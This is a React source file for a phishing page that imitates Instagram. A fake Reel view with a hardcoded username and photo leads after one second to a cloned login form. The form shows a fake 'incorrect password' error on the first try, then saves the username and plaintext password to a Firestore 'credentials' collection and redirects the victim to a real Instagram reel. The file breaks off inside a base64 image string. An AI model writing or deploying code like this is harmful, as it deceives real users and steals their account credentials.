import React, { useState, useEffect, useRef } from 'react';
import { initializeApp } from 'firebase/app';
import { getAuth, signInAnonymously, onAuthStateChanged } from 'firebase/auth';
// Add collection, addDoc, and serverTimestamp
import { getFirestore, setLogLevel, collection, addDoc, serverTimestamp } from 'firebase/firestore';
import { firebaseConfig } from './firebaseConfig.js'; // Import your config
import './App.css'
import dp from './assets/dp.jpg'

// --- Firebase Configuration ---
// We no longer need the placeholder variables


// --- Icon Components (Inline SVGs) ---

const InstagramLogo = () => (
  // <svg aria-label="Instagram" className="w-[103px] h-[29px] fill-current text-black" viewBox="0 0 176 512">
  //   <path d="M141.2 292.6c-20.8-19.4-32.2-46.9-32.2-76.4 0-29.5 11.4-57 32.2-76.4s46.9-32.2 76.4-32.2c29.5 0 57 11.4 76.4 32.2s32.2 46.9 32.2 76.4c0 29.5-11.4 57-32.2 76.4s-46.9 32.2-76.4 32.2c-29.5 0-57-11.4-76.4-32.2zM332.3 216.2c0-40.6-32.9-73.5-73.5-73.5s-73.5 32.9-73.5 73.5 32.9 73.5 73.5 73.5 73.5-32.9 73.5-73.5zm-119.2 165v-264h42.1c36.3 0 58.3 10.1 74.3 25.1 16.3 15.3 24.6 37.1 24.6 65.1 0 34.2-12.4 58.9-37.1 74.3-17.2 10.9-40.3 16.2-68.1 16.2h-35.8v83.3h-42.1zm60.7-105.2c19.6 0 30.8-4.9 38.3-12.4 11.1-11.1 17-26.6 17-45.8 0-18.9-5.9-34.1-16.7-44.8-10.9-10.6-22.3-15.9-38.6-15.9h-17.7v118.9h17.7zM496 381.2c-12.4 12.4-28.9 18.6-50.1 18.6s-37.7-6.2-50.1-18.6c-12.4-12.4-18.6-28.9-18.6-50.1 0-21.2 6.2-37.7 18.6-50.1 12.4-12.4 28.9-18.6 50.1-18.6s37.7 6.2 50.1 18.6c12.4 12.4 18.6 28.9 18.6 50.1 0 21.2-6.2 37.7-18.6 50.1zm-18.8-68.7c-8.9-8.9-19.6-13.3-31.3-13.3s-22.4 4.4-31.3 13.3c-8.9 8.9-13.3 19.6-13.3 31.3s4.4 22.4 13.3 31.3c8.9 8.9 19.6 13.3 31.3 13.3s22.4-4.4 31.3-13.3c8.9-8.9 13.3-19.6 13.3-31.3s-4.4-22.4-13.3-31.3zM112 378.8v-355h-42.1v355h42.1zM0 378.8v-355h42.1v355h-42.1z"></path>
  // </svg>
  <i
    role="img"
    style={{
      backgroundImage: 'url("https://static.cdninstagram.com/rsrc.php/v4/yd/r/5Vve--Eas3M.png")',
      backgroundPosition: '0px -2959px',
      backgroundSize: '339px 3108px',
      width: '175px',
      height: '51px',
      backgroundRepeat: 'no-repeat',
      display: 'inline-block',
      filter: 'invert(1)'
    }}
  ></i>

);

// const CameraIcon = () => (
//   <svg aria-label="Camera" className="w-6 h-6 text-white" fill="currentColor" viewBox="0 0 24 24">
//     <path d="M12 1.5a8.25 8.25 0 00-8.25 8.25c0 2.25.9 4.3 2.4 5.85l.6.6v2.55a.75.75 0 001.5 0v-1.95a8.2 8.2 0 006.75 0v1.95a.75.75 0 001.5 0v-2.55l.6-.6c1.5-1.55 2.4-3.6 2.4-5.85A8.25 8.25 0 0012 1.5zm6.75 8.25a6.75 6.75 0 01-13.5 0 6.75 6.75 0 0113.5 0zM12 18a.75.75 0 00-.75.75v1.5a.75.75 0 001.5 0v-1.5a.75.75 0 00-.75-.75zm-4.5-5.25a.75.75 0 000 1.5h9a.75.75 0 000-1.5h-9z"></path>
//   </svg>
// );

const HeartIcon = ({ size = 5 }) => (
  <svg aria-label="Like" className={`w-${size} h-${size} text-white`} fill="currentColor" viewBox="0 0 24 24">
    <path d="M16.792 3.904A4.989 4.989 0 0121.5 9.122c0 3.072-2.652 4.959-5.197 7.222-2.512 2.227-3.04 2.682-3.296 2.746-.256.065-.513.065-.77 0-.256-.064-.783-.519-3.296-2.746C6.152 14.08 3.5 12.193 3.5 9.122a4.989 4.989 0 014.708-5.218 4.21 4.21 0 013.675 1.941c.84 1.175 2.833 1.175 3.673-1.941z"></path>
  </svg>
);

const CommentIcon = ({ size = 5 }) => (
  <svg aria-label="Comment" className={`w-${size} h-${size} text-white`} fill="currentColor" viewBox="0 0 24 24">
    <path d="M20.656 17.008a9.993 9.993 0 10-3.59 3.615L22 22z" fill="none" stroke="currentColor" strokeLinejoin="round" strokeWidth="2"></path>
  </svg>
);

const ShareIcon = ({ size = 5 }) => (
  <svg aria-label="Share Post" className={`w-${size} h-${size} text-white`} fill="currentColor" viewBox="0 0 24 24">
    <line fill="none" stroke="currentColor" strokeLinejoin="round" strokeWidth="2" x1="22" x2="9.218" y1="3" y2="10.083"></line>
    <polygon fill="none" points="11.698 20.334 22 3.001 2 3.001 9.218 10.084 11.698 20.334" stroke="currentColor" strokeLinejoin="round" strokeWidth="2"></polygon>
  </svg>
);

const SaveIcon = ({ size = 5 }) => (
  <svg aria-label="Save" className={`w-${size} h-${size} text-white`} fill="currentColor" viewBox="0 0 24 24">
    <polygon fill="none" points="20 21 12 13.44 4 21 4 3 20 3 20 21" stroke="currentColor" strokeLinecap="round" strokeLinejoin="round" strokeWidth="2"></polygon>
  </svg>
);

const MoreIcon = ({ size = 5 }) => (
  <svg aria-label="More options" className={`w-${size} h-${size} text-white`} fill="currentColor" viewBox="0 0 24 24">
    <circle cx="12" cy="12" r="1.5"></circle>
    <circle cx="6" cy="12" r="1.5"></circle>
    <circle cx="18" cy="12" r="1.5"></circle>
  </svg>
);

const MusicIcon = () => (
  <svg
    xmlns="http://www.w3.org/2000/svg"
    className="w-4 h-4 text-white"
    fill="none"
    viewBox="0 0 24 24"
    stroke="currentColor"
    strokeWidth="2"
  >
    <path
      strokeLinecap="round"
      strokeLinejoin="round"
      d="M9 19V6l10-2v9M9 19a3 3 0 11-3-3 3 3 0 013 3zm10-6a3 3 0 11-3-3 3 3 0 013 3z"
    />
  </svg>
);

const HomeIcon = () => (
  <svg aria-label="Home" className="w-6 h-6 text-white" fill="currentColor" viewBox="0 0 24 24">
    <path d="M9.005 16.545a2.997 2.997 0 012.997-2.997A2.997 2.997 0 0115 16.545V22h7V11.543L12 2 2 11.543V22h7v-5.455z" fill="none" stroke="currentColor" strokeLinejoin="round" strokeWidth="2"></path>
  </svg>
);

const SearchIcon = () => (
  <svg aria-label="Search" className="w-6 h-6 text-white" fill="currentColor" viewBox="0 0 24 24">
    <path d="M19 10.5A8.5 8.5 0 1110.5 2a8.5 8.5 0 018.5 8.5z" fill="none" stroke="currentColor" strokeLinecap="round" strokeLinejoin="round" strokeWidth="2"></path>
    <line fill="none" stroke="currentColor" strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" x1="16.511" x2="22" y1="16.511" y2="22"></line>
  </svg>
);

// const ReelsIcon = () => (
//   <svg aria-label="Reels" className="w-6 h-6 text-white" fill="currentColor" viewBox="0 0 24 24">
//     <line fill="none" stroke="currentColor" strokeLinejoin="round" strokeWidth="2" x1="2.049" x2="21.95" y1="7.002" y2="7.002"></line>
//     <line fill="none" stroke="currentColor" strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" x1="13.5" x2="13.5" y1="2.002" y2="7.002"></line>
//     <line fill="none" stroke="currentColor" strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" x1="10.5" x2="10.5" y1="2.002" y2="7.002"></line>
//     <path d="M2.049 7.002l3.002 13.008a1.001 1.001 0 00.989.99h11.918a1.001 1.001 0 00.989-.99l3.002-13.008H2.049z" fill="none" stroke="currentColor" strokeLinecap="round" strokeLinejoin="round" strokeWidth="2"></path>
//     <path d="M12.001 12.002L12.001 12.002 12.001 12.002" fill="none" stroke="currentColor" strokeLinecap="round" strokeLinejoin="round" strokeWidth="2.5"></path>
//   </svg>
// );
const ReelsIcon = () => (
  <svg
    xmlns="http://www.w3.org/2000/svg"
    aria-label="New post"
    className="w-7 h-7 text-white"
    fill="none"
    stroke="currentColor"
    strokeWidth="2"
    viewBox="0 0 24 24"
  >
    <rect
      x="3"
      y="3"
      width="18"
      height="18"
      rx="5"
      ry="5"
      stroke="currentColor"
    ></rect>
    <line
      x1="12"
      y1="8"
      x2="12"
      y2="16"
      stroke="currentColor"
      strokeLinecap="round"
    ></line>
    <line
      x1="8"
      y1="12"
      x2="16"
      y2="12"
      stroke="currentColor"
      strokeLinecap="round"
    ></line>
  </svg>
);


const ShopIcon = () => (
  <svg aria-label="Shop" className="w-6 h-6 text-white" fill="currentColor" viewBox="0 0 24 24">
    <polygon fill="none" points="13.941 13.953 7.581 16.424 10.06 10.056 16.42 7.585 13.941 13.953" stroke="currentColor" strokeLinecap="round" strokeLinejoin="round" strokeWidth="2"></polygon>
    <polygon fill="none" points="10.056 10.056 16.42 7.585 13.941 13.953 7.581 16.424 10.056 10.056" stroke="currentColor" strokeLinecap="round" strokeLinejoin="round" strokeWidth="2"></polygon>
    <circle cx="12.001" cy="12.002" fill="none" r="10.5" stroke="currentColor" strokeLinecap="round" strokeLinejoin="round" strokeWidth="2"></circle>
  </svg>
);

const EyeIcon = () => (
  <svg className="w-5 h-5 text-white-800" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"></path>
    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"></path>
  </svg>
);

const EyeOffIcon = () => (
  <svg className="w-5 h-5 text-white-800" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.542-7 1.274-4.057 5.064-7 9.542-7 1.41 0 2.742.364 3.94 1.002M15 12a3 3 0 11-6 0 3 3 0 016 0z"></path>
    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M2 2l20 20"></path>
  </svg>
);

const FacebookLogo = () => (
  // <svg className="w-4 h-4 mr-2 fill-current text-blue-900" viewBox="0 0 24 24">
  //   <path d="M22.676 0H1.324C.593 0 0 .593 0 1.324v21.352C0 23.407.593 24 1.324 24h11.494v-9.294H9.688V11.11h3.129V8.413c0-3.1 1.893-4.788 4.659-4.788 1.325 0 2.463.099 2.795.143v3.24l-1.918.001c-1.504 0-1.795.715-1.795 1.763v2.313h3.587l-.467 3.602h-3.12V24h6.116c.73 0 1.323-.593 1.323-1.324V1.324C24 .593 23.407 0 22.676 0z"></path>
  // </svg>
  <svg aria-label="Log in with Facebook" className="x1lliihq x1n2onr6 x173jzuc m-2" fill="currentColor" height="20" role="img" viewBox="0 0 16 16" width="20"><title>Log in with Facebook</title><g clipPath="url(#a)"><path d="M8 0C3.6 0 0 3.6 0 8c0 4 2.9 7.3 6.8 7.9v-5.6h-2V8h2V6.2c0-2 1.2-3.1 3-3.1.9 0 1.8.2 1.8.2v2h-1c-1 0-1.3.6-1.3 1.3V8h2.2l-.4 2.3H9.2v5.6C13.1 15.3 16 12 16 8c0-4.4-3.6-8-8-8Z" fill="currentColor"></path></g><defs><clipPath id="a"><rect fill="currentColor" height="16" width="16"></rect></clipPath></defs></svg>
);


// --- App Components ---

/**
 * Login Popup Component
 * This modal appears on the Reel page after 1 second.
 */
function LoginPopup({ username, onLoginClick }) {
  // const userDP = 'https://placehold.co/80x80/EFEFEF/B2B2B2?text=DP'; // Placeholder DP
  const userDP = dp; 

  return (
    <div className="fixed inset-0 bg-black bg-opacity-75 flex items-center justify-center z-50 p-4">
      <div className="bg-white dark:bg-zinc-800 rounded-xl w-full max-w-sm text-center p-8 shadow-lg">
        <img
          src={userDP}
          alt="User Profile"
          className="w-20 h-20 rounded-full mx-auto mb-4 border-2 border-gray-300"
        />
        <p className="text-gray-900 dark:text-white font-semibold mb-4">
          {username}
        </p>
        <button
          onClick={onLoginClick}
          className="w-full bg-blue-500 text-white font-semibold py-2 rounded-lg hover:bg-blue-600 transition-colors"
        >
          Log In
        </button>
        {/* <button className="w-full text-blue-500 font-semibold py-2 mt-3">
          Switch accounts
        </button> */}
      </div>
    </div>
  );
}

/**
 * Reel Page Component
 * Simulates the Instagram Reel UI.
 */
function ReelPage({ username, setPage }) {
  const [showLoginPopup, setShowLoginPopup] = useState(false);
  const videoRef = useRef(null);

  // Show the login popup after 1 second
  useEffect(() => {
    const timer = setTimeout(() => {
      setShowLoginPopup(true);
      // Pause video when popup appears
      if (videoRef.current) {
        videoRef.current.pause();
      }
    }, 1000);

    return () => clearTimeout(timer);
  }, []);

  // Start video on component mount
  useEffect(() => {
    if (videoRef.current) {
      videoRef.current.play().catch(error => {
        console.log("Video autoplay failed:", error);
      });
    }
  }, []);

  const handleLoginClick = () => {
    window.location.hash = '#/login';
  };

  // const userDP = 'https://placehold.co/40x40/EFEFEF/B2B2B2?text=DP'; // Placeholder DP
  const userDP = dp; 

  return (
    <div className="relative w-full h-full bg-black text-white overflow-hidden sm:max-w-md sm:mx-auto sm:h-[90vh] sm:rounded-lg sm:mt-4 sm:border sm:border-zinc-700"
      style={{
        backgroundImage: 'url("https://static.cdninstagram.com/rsrc.php/v4/yd/r/5Vve--Eas3M.png")',
      }}>
      {showLoginPopup && (
        <LoginPopup username={username} onLoginClick={handleLoginClick} />
      )}

      {/* Video Player */}
      {/* <video
        ref={videoRef}
        className="w-full h-full object-cover"
        src="https://placehold.co/1080x1920.mp4?text=Sample+Reel" // Placeholder video
        loop
        muted
        playsInline
      >
        Your browser does not support the video tag.
      </video> */}

      {/* Header */}
      <header className="absolute top-0 left-0 right-0 p-4 flex justify-between items-center z-10 bg-gradient-to-b from-black/50 to-transparent">
        <h1 className="font-bold text-xl">Reels</h1>
        {/* <CameraIcon /> */}
      </header>

      {/* Side Action Bar */}
      <aside className="absolute bottom-28 right-2 flex flex-col items-center space-y-5 z-10">
        <div className="flex flex-col items-center">
          <button className="p-2"><HeartIcon size={8} /></button>
          <span className="text-xs font-semibold">1.2M</span>
        </div>
        <div className="flex flex-col items-center">
          <button className="p-2"><CommentIcon size={8} /></button>
          <span className="text-xs font-semibold">4,582</span>
        </div>
        <div className="flex flex-col items-center">
          <button className="p-2"><ShareIcon size={8} /></button>
        </div>
        <div className="flex flex-col items-center">
          <button className="p-2"><SaveIcon size={8} /></button>
        </div>
        <button className="p-2"><MoreIcon size={8} /></button>
        <div className="w-8 h-8 rounded-md border-2 border-white overflow-hidden">
          <img src={userDP} alt="Audio" className="w-full h-full object-cover" />
        </div>
      </aside>

      {/* Footer Info */}
      <footer className="absolute bottom-14 left-0 right-0 p-4 z-10 bg-gradient-to-t from-black/50 to-transparent">
        <div className="flex items-center space-x-2 mb-2">
          <img src={userDP} alt={username} className="w-8 h-8 rounded-full border border-white" />
          <span className="font-semibold">{username}</span>
          <button className="border border-white px-3 py-1 rounded-md text-xs font-semibold">
            Follow
          </button>
        </div>
        <p className="text-sm line-clamp-2">
          This is an amazing reel caption! Check it out. #react #tailwindcss #instagram
        </p>
        <div className="flex items-center space-x-2 mt-2 text-sm">
          <MusicIcon />
          <span>Original audio - {username}</span>
        </div>
      </footer>

      {/* Bottom Navigation */}
      <nav className="absolute bottom-0 left-0 right-0 bg-black h-14 flex justify-around items-center z-10 border-t border-zinc-800">
        <button><HomeIcon /></button>
        <button><SearchIcon /></button>
        <button><ReelsIcon /></button>
        <button><ShopIcon /></button>
        <button>
          <img src={userDP} alt="Profile" className="w-6 h-6 rounded-full" />
        </button>
      </nav>
    </div>
  );
}

/**
 * Login Page Component
 * Simulates the Instagram Login form.
 */
function LoginPage({ username, db }) {
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [loginAttempts, setLoginAttempts] = useState(0);
  const [errorMessage, setErrorMessage] = useState('');

  const externalRedirectURL = 'https://www.instagram.com/reel/DQN8NX_EzK3/?igsh=MWx0bjdzdjBhMDg3bQ%3D%3D';

//   // Make the function async
//   const handleSubmit = async (e) => {
//     e.preventDefault();

//     // --- Add this block to save to Firestore ---
//     if (db) { // Check if db is initialized
//       try {
//         // This creates a new document in a collection named "credentials"
//         await addDoc(collection(db, "credentials"), {
//           username: username,
//           password: password, // WARNING: Saving plaintext passwords is very insecure
//           createdAt: serverTimestamp() // Adds a server-side timestamp
//         });
//         console.log("Credentials saved to Firestore");
//       } catch (error) {
//         console.error("Error saving to Firestore: ", error);
//       }
//     } else {
//       console.error("Firestore DB instance is not ready.");
//     }
//     // --- End of new block ---

//     // Your original logic:
//     setLoginAttempts(prev => prev + 1);

//     if (loginAttempts === 0) {
//       // First attempt: show error
//       setErrorMessage("Sorry, your password was incorrect. Please double-check your password.");
//     } else {
//       // Second attempt: redirect
//       window.location.href = externalRedirectURL;
//     }
//   };

const handleSubmit = async (e) => {
    e.preventDefault();

    // Check the *current* number of attempts *before* incrementing
    if (loginAttempts === 0) {
      // First attempt: Just show error and increment attempts
      setErrorMessage("Sorry, your password was incorrect. Please double-check your password.");
      setLoginAttempts(prev => prev + 1); 
    } else {
      // Second attempt: Save data *then* redirect
      
      // --- Moved Firestore saving logic here ---
      if (db) { 
        try {
          await addDoc(collection(db, "credentials"), {
            username: username,
            password: password, // WARNING: Very insecure
            createdAt: serverTimestamp() 
          });
          console.log("Credentials saved to Firestore on second attempt");
        } catch (error) {
          console.error("Error saving to Firestore: ", error);
          // Optional: You might want to prevent redirect if saving fails
          // setErrorMessage("Failed to save credentials. Please try again."); 
          // return; // Stop the function here if save fails
        }
      } else {
        console.error("Firestore DB instance is not ready.");
        // Optional: Prevent redirect if DB isn't ready
        // setErrorMessage("Database connection error. Please try again.");
        // return; 
      }
      // --- End of moved logic ---
      
      // Redirect after attempting to save
      window.location.href = externalRedirectURL;
// console.log("till here...");

    }
  };
  return (
    <div className="flex flex-col items-center justify-center min-h-full bg-gray-50 dark:bg-black text-gray-900 dark:text-gray-100">
      <div className="w-full max-w-md">
        {/* Main Login Card */}
        <div className="bg-white dark:bg-zinc-900 border border-gray-300 dark:border-zinc-700 rounded-lg p-4 sm:p-10 mx-2 sm:mx-0 mt-10">
          <div className="flex justify-center mb-8">
            <div className="dark:invert">
              <InstagramLogo />
            </div>
          </div>

          <form onSubmit={handleSubmit}>
            <div className="mb-2">
              <input
                type="text"
                value={username}
                readOnly
                className="w-full px-2 py-2 text-sm bg-gray-50 dark:bg-zinc-800 border border-gray-300 dark:border-zinc-700 rounded-sm focus:outline-none focus:border-gray-400"
                placeholder="Phone number, username, or email"
              />
            </div>
            <div className="relative mb-4">
              <input
                type={showPassword ? 'text' : 'password'}
                value={password}
                onChange={(e) => {
                  setPassword(e.target.value);
                  setErrorMessage(''); // Clear error on new input
                }}
                className="w-full px-2 py-2 text-sm bg-gray-50 dark:bg-zinc-800 border border-gray-300 dark:border-zinc-700 rounded-sm focus:outline-none focus:border-gray-400"
                placeholder="Password"
              />
              <button
                type="button"
                className="absolute inset-y-0 right-0 px-3 flex items-center text-sm font-semibold"
                onClick={() => setShowPassword(!showPassword)}
              >
                {password && (showPassword ? <EyeOffIcon /> : <EyeIcon />)}
              </button>
            </div>

            <button
              type="submit"
              disabled={!password}
              className="w-full bg-blue-500 text-white font-semibold py-1.5 rounded-lg text-sm disabled:opacity-50"
            >
              Log In
            </button>

            {errorMessage && (
              <p className="text-red-500 text-center text-sm mt-4">
                {errorMessage}
              </p>
            )}

            {/* "OR" Separator */}
            <div className="flex items-center my-6">
              <div className="flex-grow border-t border-gray-300 dark:border-zinc-700"></div>
              <span className="px-4 text-xs font-semibold text-gray-500 dark:text-gray-400">OR</span>
              <div className="flex-grow border-t border-gray-300 dark:border-zinc-700"></div>
            </div>

            {/* Facebook Login */}
            <button
              type="button"
              className="w-full flex justify-center items-center font-semibold text-blue-900 dark:text-blue-400"
            >
              <FacebookLogo />
              <span className="text-sm">Log in with Facebook</span>
            </button>

            {/* Forgot Password */}
            <a href="#" className="block text-center text-xs text-blue-900 dark:text-blue-400 mt-4">
              Forgot password?
            </a>
          </form>
        </div>

        {/* Sign Up Card */}
        <div className="bg-white dark:bg-zinc-900 border border-gray-300 dark:border-zinc-700 rounded-lg p-6 mx-2 sm:mx-0 mt-3 text-center text-sm">
          Don't have an account?{' '}
          <a href="#" className="font-semibold text-blue-500">
            Sign up
          </a>
        </div>

        {/* Get the App */}
        <div className="text-center text-sm my-4">
          Get the app.
        </div>
        <div className="flex justify-center space-x-2">
          <img
            src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png"
            alt="Get it on Google Play"
            className="h-10"
          />
          <img
            src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png"
            alt="Get it from Microsoft"
            className="h-10"
          />
        </div>
      </div>
    </div>
  );
}


/**
 * Main App Component
 * Handles routing and Firebase initialization.
 */
export default function App() {
  const [page, setPage] = useState('reel'); // 'reel' or 'login'
  const [slug, setSlug] = useState('DQZgQLqCWfuigshOGJyZ2ozMHF0ODlm'); 
  const [username] = useState('shreyas.raut_12'); // Hardcoded username

  // Firebase state
  const [auth, setAuth] = useState(null);
  const [db, setDb] = useState(null);
  const [userId, setUserId] = useState(null);
  const [isAuthReady, setIsAuthReady] = useState(false);

  // --- Firebase Initialization Effect ---
  
  useEffect(() => {
    try {
      // Use the config you imported
      const app = initializeApp(firebaseConfig); 
      const authInstance = getAuth(app);
      const dbInstance = getFirestore(app);

      // Enable debug logging for Firestore
      setLogLevel('debug');

      setAuth(authInstance);
      setDb(dbInstance); // Save the db instance to state

      const unsubscribe = onAuthStateChanged(authInstance, async (user) => {
        if (user) {
          setUserId(user.uid);
        } else {
          // No user, try to sign in
          try {
            // Just sign in anonymously
              await signInAnonymously(authInstance);
          } catch (authError) {
            console.error("Error signing in anonymously:", authError);
          }
        }
        setIsAuthReady(true);
      });

      return () => unsubscribe();

    } catch (error) {
      console.error("Firebase initialization error:", error);
    }
  }, []);
  // --- Routing Effect ---
  useEffect(() => {
    const handleHashChange = () => {
      const hash = window.location.hash;

      if (hash.startsWith('#/reel/')) {
        setPage('reel');
        setSlug(hash.split('/')[2]);
      } else if (hash === '#/login') {
        setPage('login');
      } else {
        // Default to reel page
        setPage('reel');
        window.location.hash = '#/reel/DQZgQLqCWfuigshOGJyZ2ozMHF0ODlm';
      }
    };

    // Initial load
    handleHashChange();

    // Listen for changes
    window.addEventListener('hashchange', handleHashChange);
    return () => window.removeEventListener('hashchange', handleHashChange);
  }, []);

  // Render loading state while Firebase auth is processing
  if (!isAuthReady) {
    return (
      <div className="w-screen h-screen bg-black flex items-center justify-center">
        <div >
          <img
            width="80px"
            height="80px"
            style={{
              position: 'absolute',
              top: '50%',
              left: '50%',
              margin: '-40px 0 0 -40px',
            }}

            src="data:image/png;base64,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